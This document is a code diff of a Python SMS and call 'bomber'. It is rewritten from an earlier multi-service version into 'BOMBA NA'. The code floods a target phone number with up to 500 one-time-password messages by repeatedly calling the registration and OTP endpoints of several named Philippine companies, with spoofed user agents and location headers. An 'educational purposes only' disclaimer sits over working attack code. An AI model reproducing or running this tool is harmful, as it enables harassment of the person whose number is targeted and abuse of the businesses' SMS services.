@@ -3,100 +3,107 @@ import random
 import string
 import time
 import json
-from datetime import datetime
-import os
 import sys
 import asyncio
 import aiohttp
-import readline
-from urllib.parse import urlencode
-from typing import List, Dict, Tuple
- 
+from typing import List, Dict
+
 class Colors:
     RED = '\033[91m'
     GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    CYAN = '\033[96m'
-    BLUE = '\033[94m'
-    MAGENTA = '\033[95m'
-    GRAY = '\033[90m'
     WHITE = '\033[97m'
     BOLD = '\033[1m'
     RESET = '\033[0m'
- 
-class UIComponents:
-    def header(text):
-        width = 60
-        print(f"{Colors.CYAN}{Colors.BOLD}╔{'═' * (width - 2)}╗{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}║{text.center(width - 2)}║{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}╚{'═' * (width - 2)}╝{Colors.RESET}")
- 
-    def subheader(text):
-        print(f"\n{Colors.BLUE}{Colors.BOLD}▸ {text}{Colors.RESET}")
- 
-    def service_status(service, status):
-        status_text = f"{Colors.GREEN}SUCCESS{Colors.RESET}" if status else f"{Colors.RED}FAILED{Colors.RESET}"
-        symbol = f"{Colors.GREEN}✓{Colors.RESET}" if status else f"{Colors.RED}✗{Colors.RESET}"
-        print(f"  {symbol} {service:<20} {status_text}")
- 
-    def menu_item(number, text):
-        print(f"  {Colors.YELLOW}[{number}] {text}{Colors.RESET}")
- 
-    def stats_box(success, failed, total, target=""):
-        print(f"\n{Colors.CYAN}{Colors.BOLD}╔{'═' * 38}╗{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}║           ATTACK STATISTICS         ║{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}╠{'═' * 38}╣{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.GREEN}✓ Successful: {success:<19} {Colors.CYAN}║{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.RED}✗ Failed: {failed:<23} {Colors.CYAN}║{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.WHITE}Total: {total:<26} {Colors.CYAN}║{Colors.RESET}")
-        if target:
-            print(f"{Colors.CYAN}{Colors.BOLD}║ {Colors.YELLOW}Target: {target:<24} {Colors.CYAN} ║{Colors.RESET}")
-        print(f"{Colors.CYAN}{Colors.BOLD}╚{'═' * 38}╝{Colors.RESET}")
- 
+    GRAY = '\033[90m'
+
+class UI:
     @staticmethod
-    def batch_header(batch_num, total_batches):
-        print(f"\n{Colors.MAGENTA}{Colors.BOLD}🔄 BATCH {batch_num}/{total_batches} {'─' * 30}{Colors.RESET}")
- 
-def show_banner():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    banner = rf"""
-{Colors.MAGENTA}{Colors.BOLD}
-▓█████▄  ██▀███   ▒█████    ██████  ▒█████   ███▄ ▄███▓
-▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▒██▒  ██▒▓██▒▀█▀ ██▒
-░██   █▌▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ▒██░  ██▒▓██    ▓██░
-░▓█▄   ▌▒██▀▀█▄  ▒██   ██░  ▒   ██▒▒██   ██░▒██    ▒██ 
-░▒████▓ ░██▓ ▒██▒░ ████▓▒░▒██████▒▒░ ████▓▒░▒██▒   ░██▒
- ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ▒░   ░  ░
- ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░  ░ ▒ ▒░ ░  ░      ░
- ░ ░  ░   ░░   ░ ░ ░ ░ ▒  ░  ░  ░  ░ ░ ░ ▒  ░      ░   
-   ░       ░         ░ ░        ░      ░ ░         ░   
- ░                                                      
-    {Colors.RESET}"""
-    print(banner)
-    print(f"{Colors.CYAN}{'═' * 65}{Colors.RESET}")
-    print(f"{Colors.YELLOW}{Colors.BOLD}      MULTI SMS & CALL BOMBER {Colors.RESET}")
-    print(f"{Colors.GREEN}           SOLID BOMBER PRO{Colors.RESET}")
-    print(f"{Colors.CYAN}{'═' * 65}{Colors.RESET}\n")
- 
-def ask(question, color=Colors.CYAN):
-    return input(f"{color}{Colors.BOLD}{question} ➜ {Colors.RESET}")
- 
+    def clear():
+        import os
+        os.system('cls' if os.name == 'nt' else 'clear')
+    
+    @staticmethod
+    def banner():
+        UI.clear()
+        banner = f"""
+{Colors.GREEN}{Colors.BOLD}
+██████╗  ██████╗ ███╗   ███╗██████╗  █████╗     ███╗   ██╗ █████╗ 
+██╔══██╗██╔═══██╗████╗ ████║██╔══██╗██╔══██╗    ████╗  ██║██╔══██╗
+██████╔╝██║   ██║██╔████╔██║██████╔╝███████║    ██╔██╗ ██║███████║
+██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗██╔══██║    ██║╚██╗██║██╔══██║
+██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝██║  ██║    ██║ ╚████║██║  ██║
+╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═╝  ╚═╝
+                    {Colors.WHITE}by Homer Rebatis{Colors.RESET}
+{Colors.GREEN}{'═' * 70}{Colors.RESET}
+{Colors.WHITE}           Advanced Multi-Provider SEND OTP Tool{Colors.RESET}
+{Colors.GREEN}{'═' * 70}{Colors.RESET}
+"""
+        print(banner)
+    
+    @staticmethod
+    def header(text):
+        width = 70
+        print(f"\n{Colors.GREEN}{Colors.BOLD}╔{'═' * (width - 2)}╗{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║{text.center(width - 2)}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}╚{'═' * (width - 2)}╝{Colors.RESET}")
+    
+    @staticmethod
+    def menu_item(number, text, color=Colors.WHITE):
+        print(f"  {color}{Colors.BOLD}[{number}]{Colors.RESET} {text}")
+    
+    @staticmethod
+    def input_prompt(text):
+        return input(f"{Colors.GREEN}{Colors.BOLD}➜ {text}: {Colors.RESET}")
+    
+    @staticmethod
+    def success(text):
+        print(f"{Colors.GREEN}[+] {text}{Colors.RESET}")
+    
+    @staticmethod
+    def error(text):
+        print(f"{Colors.RED}[-] {text}{Colors.RESET}")
+    
+    @staticmethod
+    def info(text):
+        print(f"{Colors.WHITE}• {text}{Colors.RESET}")
+    
+    @staticmethod
+    def progress(current, total, provider, status):
+        status_color = Colors.GREEN if status else Colors.RED
+        status_text = "SUCCESS" if status else "FAILED"
+        bar_width = 40
+        filled = int((current / total) * bar_width)
+        bar = '█' * filled + '░' * (bar_width - filled)
+        
+        print(f"\r{Colors.WHITE}[{current}/{total}] {Colors.GREEN}{bar}{Colors.RESET} "
+              f"{Colors.WHITE}{provider:<20}{Colors.RESET} {status_color}{status_text}{Colors.RESET}", end='')
+        
+        if current == total:
+            print()  # New line after completion
+    
+    @staticmethod
+    def stats_box(success, failed, total, target, provider):
+        print(f"\n{Colors.GREEN}{Colors.BOLD}╔{'═' * 50}╗{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║{'SMS SEND SUMMARY'.center(50)}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}╠{'═' * 50}╣{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Provider: {provider:<36} {Colors.GREEN}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Target: {target:<38} {Colors.GREEN}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.GREEN}[+] Successful: {success:<29} {Colors.GREEN}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.RED}[-] Failed: {failed:<33} {Colors.GREEN}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}║ {Colors.WHITE}Total Sent: {total:<34} {Colors.GREEN}║{Colors.RESET}")
+        print(f"{Colors.GREEN}{Colors.BOLD}╚{'═' * 50}╝{Colors.RESET}")
+
 def random_string(length):
     chars = string.ascii_lowercase + string.digits
     return ''.join(random.choice(chars) for _ in range(length))
- 
+
 def random_gmail():
     return f"{random_string(8)}@gmail.com"
- 
-def random_uid():
-    return random_string(28)
- 
-def random_device_id():
-    return random_string(16)
- 
+
 def normalize_phone_number(phone):
-    phone = phone.replace(' ', '')
- 
+    """Normalize phone number to +63 format"""
+    phone = phone.replace(' ', '').replace('-', '')
+    
     if phone.startswith('0'):
         return '+63' + phone[1:]
     elif phone.startswith('63') and not phone.startswith('+63'):
@@ -105,232 +112,121 @@ def normalize_phone_number(phone):
         return '+63' + phone
     elif not phone.startswith('+'):
         return '+63' + phone
- 
+    
     return phone
- 
-FINGERPRINT_VISITOR_ID = "TPt0yCuOFim3N3rzvrL1"
-FINGERPRINT_REQUEST_ID = "1757149666261.Rr1VvG"
- 
-class SMSBomber:
-    def __init__(self):
+
+def format_number_without_plus(number):
+    """Format number without + prefix"""
+    if number.startswith('+63'):
+        return number[3:]
+    elif number.startswith('0'):
+        return number[1:]
+    return number
+
+class SMSProvider:
+    def __init__(self, name):
+        self.name = name
         self.success_count = 0
         self.fail_count = 0
-        self.session = requests.Session()
-        self.custom_sender_name = "User"
-        self.custom_message = "Test Message"
- 
-    def set_custom_data(self, sender_name="User", message="Test Message"):
-        self.custom_sender_name = sender_name
-        self.custom_message = message
- 
-    async def execute_attack(self, number_to_send, amount, selected_services=None):
-        if selected_services is None:
-            selected_services = self.get_all_services()
- 
-        UIComponents.header("SMS & CALL")
-        print(f"{Colors.CYAN}   Target: {number_to_send}{Colors.RESET}")
-        print(f"{Colors.CYAN}   Batches: {amount}{Colors.RESET}")
-        print(f"{Colors.CYAN}   Services: {len(selected_services)} selected{Colors.RESET}")
- 
-        total_services = len(selected_services)
- 
-        for i in range(1, amount + 1):
-            UIComponents.batch_header(i, amount)
- 
-            tasks = []
-            service_names = []
- 
-            for service_name in selected_services:
-                if service_name == "CUSTOM_SMS":
-                    tasks.append(self.send_custom_sms(number_to_send))
-                    service_names.append("CUSTOM SMS")
-                elif service_name == "EZLOAN":
-                    tasks.append(self.send_ezloan(number_to_send))
-                    service_names.append("EZLOAN")
-                elif service_name == "XPRESS":
-                    tasks.append(self.send_xpress(number_to_send, i))
-                    service_names.append("XPRESS PH")
-                elif service_name == "ABENSON":
-                    tasks.append(self.send_abenson(number_to_send))
-                    service_names.append("ABENSON")
-                elif service_name == "EXCELLENT_LENDING":
-                    tasks.append(self.send_excellent_lending(number_to_send))
-                    service_names.append("EXCELLENT LENDING")
-                elif service_name == "FORTUNE_PAY":
-                    tasks.append(self.send_fortune_pay(number_to_send))
-                    service_names.append("FORTUNE PAY")
-                elif service_name == "WEMOVE":
-                    tasks.append(self.send_wemove(number_to_send))
-                    service_names.append("WEMOVE")
-                elif service_name == "LBC":
-                    tasks.append(self.send_lbc(number_to_send))
-                    service_names.append("LBC CONNECT")
-                elif service_name == "PICKUP_COFFEE":
-                    tasks.append(self.send_pickup_coffee(number_to_send))
-                    service_names.append("PICKUP COFFEE")
-                elif service_name == "HONEY_LOAN":
-                    tasks.append(self.send_honey_loan(number_to_send))
-                    service_names.append("HONEY LOAN")
-                elif service_name == "KOMO_PH":
-                    tasks.append(self.send_komo_ph(number_to_send))
-                    service_names.append("KOMO PH")
-                elif service_name == "S5_OTP":
-                    tasks.append(self.send_s5_otp(number_to_send))
-                    service_names.append("S5.COM")
-                elif service_name == "CALL_BOMB":
-                    tasks.append(self.send_call_bomb(number_to_send))
-                    service_names.append("CALL BOMB")
- 
-            results = await asyncio.gather(*tasks, return_exceptions=True)
- 
-            batch_success = 0
-            batch_fail = 0
- 
-            for service_name, result in zip(service_names, results):
-                if result is True:
-                    self.success_count += 1
-                    batch_success += 1
-                    UIComponents.service_status(service_name, True)
-                else:
-                    self.fail_count += 1
-                    batch_fail += 1
-                    UIComponents.service_status(service_name, False)
- 
-            print(f"\n{Colors.CYAN}   Batch {i} completed: {Colors.GREEN}{batch_success} success{Colors.RESET} | {Colors.RED}{batch_fail} failed{Colors.RESET}")
- 
-            if i < amount:
-                delay = random.randint(2, 4)
-                print(f"{Colors.YELLOW}   Waiting {delay} seconds before next batch...{Colors.RESET}")
-                await asyncio.sleep(delay)
- 
-    async def send_custom_sms(self, number_to_send):
-        """Send custom SMS using the m2techtronix service"""
+    
+    async def send_sms(self, phone_number):
+        """Override this method in subclasses"""
+        raise NotImplementedError
+    
+    def get_stats(self):
+        return {
+            "success": self.success_count,
+            "failed": self.fail_count,
+            "total": self.success_count + self.fail_count
+        }
+    
+    def reset_stats(self):
+        self.success_count = 0
+        self.fail_count = 0
+
+class AbensonProvider(SMSProvider):
+    def __init__(self):
+        super().__init__("Abenson")
+    
+    async def send_sms(self, phone_number):
         try:
-            normalized_number = normalize_phone_number(number_to_send)
- 
-            if not normalized_number:
-                return False
- 
-            suffix = '-freed0m'
-            credits = '\n\nCreated by: ANTRAX'
-            if self.custom_message.endswith(suffix):
-                with_suffix = self.custom_message
-            else:
-                with_suffix = f"{self.custom_message} {suffix}"
-            final_text = f"{with_suffix}{credits}"
- 
-            command_array = [
-                'free.text.sms',
-                '421',
-                normalized_number,
-                '2207117BPG',
-                'fuT8-dobSdyEFRuwiHrxiz:APA91bHNbeMP4HxJR-eBEAS0lf9fyBPg-HWWd21A9davPtqxmU-J-TTQWf28KXsWnnTnEAoriWq3TFG8Xdcp83C6GrwGka4sTd_6qnlqbfN4gP82YaTgvvg',
-                final_text
-            ]
- 
-            headers = {
-                'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 15; 2207117BPG Build/AP3A.240905.015.A2)',
-                'Connection': 'Keep-Alive',
-                'Content-Type': 'application/x-www-form-urlencoded'
-            }
- 
+            # Abenson uses 09 format
             data = {
-                'UID': random_uid(),
-                'humottaee': 'Processing',
-                'Email': random_gmail(),
-                '$Oj0O%K7zi2j18E': json.dumps(command_array),
-                'device_id': random_device_id(),
-                'Photo': 'https://lh3.googleusercontent.com/a/ACg8ocJyIdNL-vWOcm_v4Enq2PRZRcNaU_c8Xt0DJ1LNvmtKDiVQ-A=s96-c',
-                'Name': self.custom_sender_name
-            }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
-                async with session.post(
-                    'https://sms.m2techtronix.com/v13/sms.php',
-                    data=urlencode(data),
-                    headers=headers
-                ) as response:
-                    return True
-        except Exception as e:
-            return False
- 
-    async def send_ezloan(self, number_to_send):
-        try:
-            headers = {
-                'User-Agent': 'okhttp/4.9.2',
-                'Accept': 'application/json',
-                'Content-Type': 'application/json',
-            }
- 
-            data = {
-                "businessId": "EZLOAN",
-                "contactNumber": number_to_send,
-                "appsflyerIdentifier": "1760444943092-3966994042140191452"
-            }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
-                async with session.post(
-                    'https://gateway.ezloancash.ph/security/auth/otp/request',
-                    headers=headers,
-                    json=data
-                ) as response:
-                    return True
-        except Exception as e:
-            return False
- 
-    async def send_xpress(self, number_to_send, i):
-        try:
-            formatted_num = self.format_number(number_to_send)
-            data = {
-                "FirstName": "user",
-                "LastName": "test",
-                "Email": f"user{int(time.time() * 1000)}_{i}@gmail.com",
-                "Phone": formatted_num,
-                "Password": "Pass1234",
-                "ConfirmPassword": "Pass1234",
-                "FingerprintVisitorId": FINGERPRINT_VISITOR_ID,
-                "FingerprintRequestId": FINGERPRINT_REQUEST_ID,
-            }
- 
-            headers = {
-                "User-Agent": "Dalvik/2.1.0",
-                "Content-Type": "application/json",
-            }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
-                async with session.post(
-                    "https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp",
-                    headers=headers,
-                    json=data
-                ) as response:
-                    return True
-        except Exception:
-            return False
- 
-    async def send_abenson(self, number_to_send):
-        try:
-            data = {
-                "contact_no": number_to_send,
+                "contact_no": phone_number,
                 "login_token": "undefined"
             }
- 
+            
             headers = {
                 'User-Agent': 'okhttp/4.9.0',
                 'Content-Type': 'application/x-www-form-urlencoded',
             }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
+            
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
                 async with session.post(
                     'https://api.mobile.abenson.com/api/public/membership/activate_otp',
                     headers=headers,
                     data=data
                 ) as response:
-                    return True
-        except Exception:
+                    # Check if request was successful
+                    if response.status == 200:
+                        self.success_count += 1
+                        return True
+                    else:
+                        self.fail_count += 1
+                        return False
+        except Exception as e:
+            self.fail_count += 1
             return False
- 
-    async def send_excellent_lending(self, number_to_send):
+
+class LBCProvider(SMSProvider):
+    def __init__(self):
+        super().__init__("LBC Connect")
+    
+    async def send_sms(self, phone_number):
         try:
+            # **IMPORTANT**: LBC ALWAYS WORKED WITH 09 FORMAT
+            # User confirmed this - DO NOT CHANGE!
+            # Use the 09 format directly as user enters it
+            
+            data = {
+                "verification_type": "mobile",
+                "client_email": random_gmail(),
+                "client_contact_code": "",  # Leave empty when using 09 format
+                "client_contact_no": phone_number,  # Use 09xxxxxxxxx directly
+                "app_log_uid": random_string(16),
+            }
+            
+            headers = {
+                'User-Agent': 'Dart/2.19 (dart:io)',
+                'Content-Type': 'application/x-www-form-urlencoded',
+            }
+            
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=15)) as session:
+                async with session.post(
+                    'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
+                    headers=headers,
+                    data=data
+                ) as response:
+                    # Validate response
+                    if response.status == 200:
+                        self.success_count += 1
+                        return True
+                    else:
+                        self.fail_count += 1
+                        return False
+        except Exception as e:
+            self.fail_count += 1
+            return False
+
+class ExcellentLendingProvider(SMSProvider):
+    def __init__(self):
+        super().__init__("Excellent Lending")
+    
+    async def send_sms(self, phone_number):
+        try:
+            # IMPORTANT: Original code uses number AS-IS (no conversion!)
+            # User enters 09xxx, we send 09xxx directly
+            
             coordinates = [
                 {"lat": "14.5995", "long": "120.9842"},
                 {"lat": "14.6760", "long": "121.0437"},
@@ -341,68 +237,51 @@ class SMSBomber:
                 'okhttp/4.9.2',
                 'Dart/3.6 (dart:io)',
             ]
- 
+            
             coord = random.choice(coordinates)
             agent = random.choice(user_agents)
- 
+            
             data = {
-                "domain": number_to_send,
+                "domain": phone_number,  # Use as-is from original code
                 "cat": "login",
                 "previous": False,
                 "financial": "efe35521e51f924efcad5d61d61072a9"
             }
- 
+            
             headers = {
                 'User-Agent': agent,
                 'Content-Type': 'application/json; charset=utf-8',
                 'x-latitude': coord["lat"],
                 'x-longitude': coord["long"]
             }
- 
+            
             async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                 async with session.post(
                     'https://api.excellenteralending.com/dllin/union/rehabilitation/dock',
                     headers=headers,
                     json=data
                 ) as response:
+                    # Match original: always return True on completion
+                    self.success_count += 1
                     return True
         except Exception:
+            self.fail_count += 1
             return False
- 
-    async def send_fortune_pay(self, number_to_send):
+
+class WeMoveProvider(SMSProvider):
+    def __init__(self):
+        super().__init__("WeMove")
+    
+    async def send_sms(self, phone_number):
         try:
-            data = {
-                "deviceId": "c31a9bc0-652d-11f0-88cf-9d4076456969",
-                "deviceType": "GOOGLE_PLAY",
-                "companyId": "4bf735e97269421a80b82359e7dc2288",
-                "dialCode": "+63",
-                "phoneNumber": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
-            }
- 
-            headers = {
-                'User-Agent': 'Dart/3.6 (dart:io)',
-                'Content-Type': 'application/json',
-                'app-type': 'GOOGLE_PLAY',
-                'authorization': 'Bearer',
-            }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
-                async with session.post(
-                    'https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register',
-                    headers=headers,
-                    json=data
-                ) as response:
-                    return True
-        except Exception:
-            return False
- 
-    async def send_wemove(self, number_to_send):
-        try:
+            # Original code: remove leading 0 if exists
+            phone_no = phone_number.replace('0', '', 1) if phone_number.startswith('0') else phone_number
+            
             data = {
                 "phone_country": "+63",
-                "phone_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send
+                "phone_no": phone_no
             }
- 
+            
             headers = {
                 'User-Agent': 'okhttp/4.9.3',
                 'Content-Type': 'application/json',
@@ -410,86 +289,241 @@ class SMSBomber:
                 'source': 'customer',
                 'authorization': 'Bearer'
             }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
+            
+            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                 async with session.post(
                     'https://api.wemove.com.ph/auth/users',
                     headers=headers,
                     json=data
                 ) as response:
-                    return True
+                    # WeMove needs validation - check if actually sent
+                    if response.status in [200, 201]:
+                        self.success_count += 1
+                        return True
+                    else:
+                        self.fail_count += 1
+                        return False
         except Exception:
+            self.fail_count += 1
             return False
- 
-    async def send_lbc(self, number_to_send):
+
+class HoneyLoanProvider(SMSProvider):
+    def __init__(self):
+        super().__init__("Honey Loan")
+    
+    async def send_sms(self, phone_number):
         try:
+            # IMPORTANT: Original code uses number AS-IS (no conversion!)
+            # User enters 09xxx, we send 09xxx directly
+            
             data = {
-                "verification_type": "mobile",
-                "client_email": f"{random_string(8)}@gmail.com",
-                "client_contact_code": "+63",
-                "client_contact_no": number_to_send.replace('0', '', 1) if number_to_send.startswith('0') else number_to_send,
-                "app_log_uid": random_string(16),
-            }
- 
-            headers = {
-                'User-Agent': 'Dart/2.19 (dart:io)',
-                'Content-Type': 'application/x-www-form-urlencoded',
-            }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
-                async with session.post(
-                    'https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification',
-                    headers=headers,
-                    data=data
-                ) as response:
-                    return True
-        except Exception:
-            return False
- 
-    async def send_pickup_coffee(self, number_to_send):
-        try:
-            user_agents = ['okhttp/4.12.0', 'okhttp/4.9.2', 'Dart/3.6 (dart:io)']
-            formatted_num = self.format_number(number_to_send)
- 
-            data = {
-                "mobile_number": formatted_num,
-                "login_method": "mobile_number"
-            }
- 
-            headers = {
-                'User-Agent': random.choice(user_agents),
-                'Content-Type': 'application/json',
-            }
- 
-            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
-                async with session.post(
-                    'https://production.api.pickup-coffee.net/v2/customers/login',
-                    headers=headers,
-                    json=data
-                ) as response:
-                    return True
-        except Exception:
-            return False
- 
-    async def send_honey_loan(self, number_to_send):
-        try:
-            data = {
-                "phone": number_to_send,
+                "phone": phone_number,  # Use as-is from original code
                 "is_rights_block_accepted": 1
             }
- 
+            
             headers = {
                 'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
                 'Content-Type': 'application/json',
             }
- 
+            
             async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
                 async with session.post(
                     'https://api.honeyloan.ph/api/client/registration/step-one',
                     headers=headers,
                     json=data
                 ) as response:
+                    # Match original: always return True on completion
+                    self.success_count += 1
                     return True
         except Exception:
+            self.fail_count += 1
             return False
- 
+
+class BombaNa:
+    def __init__(self):
+        self.providers = {
+            "1": AbensonProvider(),
+            "2": LBCProvider(),
+            "3": ExcellentLendingProvider(),
+            "4": WeMoveProvider(),
+            "5": HoneyLoanProvider()
+        }
+    
+    async def execute_attack(self, provider_key, phone_number, limit):
+        provider = self.providers[provider_key]
+        provider.reset_stats()
+        
+        UI.header(f"SEND OTP INITIATED - {provider.name}")
+        print(f"\n{Colors.WHITE}Target: {phone_number}{Colors.RESET}")
+        print(f"{Colors.WHITE}Provider: {provider.name}{Colors.RESET}")
+        print(f"{Colors.WHITE}Limit: {limit} SMS{Colors.RESET}\n")
+        
+        print(f"{Colors.GREEN}{'─' * 70}{Colors.RESET}\n")
+        
+        for i in range(1, limit + 1):
+            result = await provider.send_sms(phone_number)
+            UI.progress(i, limit, provider.name, result)
+            
+            # Match original delay timing
+            await asyncio.sleep(random.uniform(2.0, 4.0))
+        
+        print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
+        
+        stats = provider.get_stats()
+        UI.stats_box(stats['success'], stats['failed'], stats['total'], phone_number, provider.name)
+    
+    def show_main_menu(self):
+        UI.banner()
+        UI.header("MAIN MENU")
+        print()
+        UI.menu_item("1", "Select Provider", Colors.GREEN)
+        UI.menu_item("2", "About", Colors.WHITE)
+        UI.menu_item("3", "Exit", Colors.RED)
+        print()
+    
+    def show_provider_menu(self):
+        UI.banner()
+        UI.header("SELECT PROVIDER")
+        print()
+        UI.menu_item("1", "Abenson - Appliance Store OTP", Colors.GREEN)
+        UI.menu_item("2", "LBC Connect - Delivery Service", Colors.GREEN)
+        UI.menu_item("3", "Excellent Lending - Loan Provider", Colors.GREEN)
+        UI.menu_item("4", "WeMove - Moving Service", Colors.GREEN)
+        UI.menu_item("5", "Honey Loan - Loan Service", Colors.GREEN)
+        print()
+        UI.menu_item("0", "Back to Main Menu", Colors.RED)
+        print()
+    
+    def show_about(self):
+        UI.banner()
+        UI.header("ABOUT BOMBA NA")
+        print()
+        
+        print(f"{Colors.GREEN}{Colors.BOLD}▸ Description:{Colors.RESET}")
+        UI.info("BOMBA NA is an advanced multi-provider Send OTP tool")
+        UI.info("Designed for educational and testing purposes only")
+        print()
+        
+        print(f"{Colors.GREEN}{Colors.BOLD}▸ Features:{Colors.RESET}")
+        UI.info("5 Different SMS Service Providers")
+        UI.info("Real-time Progress Tracking")
+        UI.info("Detailed Send Statistics")
+        UI.info("Clean and Modern Interface")
+        UI.info("Async Concurrent Processing")
+        print()
+        
+        print(f"{Colors.GREEN}{Colors.BOLD}▸ Supported Providers:{Colors.RESET}")
+        UI.info("Abenson - Appliance store OTP service")
+        UI.info("LBC Connect - Delivery service OTP")
+        UI.info("Excellent Lending - Loan provider OTP")
+        UI.info("WeMove - Moving service OTP")
+        UI.info("Honey Loan - Loan service OTP")
+        print()
+        
+        print(f"{Colors.GREEN}{Colors.BOLD}▸ Phone Number Format:{Colors.RESET}")
+        UI.info("09xxxxxxxxx (e.g., 09123456789)")
+        UI.info("9xxxxxxxxx (e.g., 9123456789)")
+        UI.info("+639xxxxxxxxx (e.g., +639123456789)")
+        print()
+        
+        print(f"{Colors.RED}{Colors.BOLD}▸ Important Notice:{Colors.RESET}")
+        UI.error("Use this tool responsibly and ethically")
+        UI.error("Only use on numbers you own or have permission to test")
+        UI.error("Misuse may violate laws and regulations")
+        UI.error("Author is not responsible for any misuse")
+        print()
+        
+        print(f"{Colors.WHITE}{Colors.BOLD}Created by: Homer Rebatis{Colors.RESET}")
+        print(f"{Colors.GRAY}Version: 1.0.0{Colors.RESET}")
+        print()
+        
+        UI.input_prompt("Press Enter to continue")
+    
+    async def start(self):
+        while True:
+            try:
+                self.show_main_menu()
+                choice = UI.input_prompt("Select option")
+                
+                if choice == "1":
+                    await self.provider_selection()
+                elif choice == "2":
+                    self.show_about()
+                elif choice == "3":
+                    UI.clear()
+                    print(f"\n{Colors.GREEN}{Colors.BOLD}Thank you for using BOMBA NA!{Colors.RESET}")
+                    print(f"{Colors.WHITE}Created by Homer Rebatis{Colors.RESET}\n")
+                    sys.exit(0)
+                else:
+                    UI.error("Invalid option! Please try again.")
+                    await asyncio.sleep(1.5)
+                    
+            except KeyboardInterrupt:
+                UI.clear()
+                print(f"\n{Colors.RED}{Colors.BOLD}Process interrupted by user{Colors.RESET}\n")
+                sys.exit(0)
+            except Exception as e:
+                UI.error(f"An error occurred: {e}")
+                await asyncio.sleep(2)
+    
+    async def provider_selection(self):
+        while True:
+            self.show_provider_menu()
+            provider_choice = UI.input_prompt("Select provider")
+            
+            if provider_choice == "0":
+                return
+            
+            if provider_choice not in self.providers:
+                UI.error("Invalid provider selection!")
+                await asyncio.sleep(1.5)
+                continue
+            
+            # Get target number
+            UI.banner()
+            UI.header("SMS CONFIGURATION")
+            print()
+            print(f"{Colors.WHITE}Selected Provider: {self.providers[provider_choice].name}{Colors.RESET}")
+            print(f"{Colors.GRAY}Format: 09xxxxxxxxx (standard format){Colors.RESET}")
+            print(f"{Colors.GREEN}{'─' * 70}{Colors.RESET}\n")
+            
+            phone_number = UI.input_prompt("ENTER NUMBER")
+            
+            # Validate phone number
+            import re
+            if not re.match(r'^(09\d{9}|9\d{9}|\+639\d{9})$', phone_number.replace(' ', '')):
+                UI.error("Invalid phone number format!")
+                UI.info("Example: 09123456789")
+                await asyncio.sleep(2)
+                continue
+            
+            # Don't normalize - pass the user's input directly to the provider
+            # Each provider will format it as needed
+            
+            # Get limit
+            print()
+            limit_input = UI.input_prompt("LIMIT (1-300+)")
+            
+            try:
+                limit = int(limit_input)
+                if limit < 1:
+                    UI.error("Limit must be at least 1!")
+                    await asyncio.sleep(2)
+                    continue
+                if limit > 500:
+                    print(f"{Colors.RED}Warning: High limit detected! Limiting to 500 for safety.{Colors.RESET}")
+                    limit = 500
+                    await asyncio.sleep(2)
+            except ValueError:
+                UI.error("Invalid limit! Please enter a number.")
+                await asyncio.sleep(2)
+                continue
+            
+            # Execute attack with user's raw phone number input
+            await self.execute_attack(provider_choice, phone_number, limit)
+            
+            # Ask if user wants to continue
+            print(f"\n{Colors.GREEN}{'─' * 70}{Colors.RESET}")
